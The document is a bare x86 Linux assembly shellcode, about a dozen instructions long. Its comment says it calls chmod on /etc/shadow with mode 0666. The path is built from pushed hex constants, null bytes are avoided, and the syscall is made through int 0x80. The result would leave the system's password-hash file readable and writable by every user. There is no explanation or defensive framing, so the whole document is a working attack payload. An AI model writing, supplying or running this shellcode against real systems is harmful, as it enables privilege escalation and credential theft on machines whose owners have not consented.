section .text
global _start
 
_start:
        ; chmod("//etc/shadow", 0666);
        xor eax, eax
        mov al, 15
        cdq
        push edx
        push dword 0x776f6461
        push dword 0x68732f63
        push dword 0x74652f2f
        mov ebx, esp
        mov cx, 0666o
        int 0x80
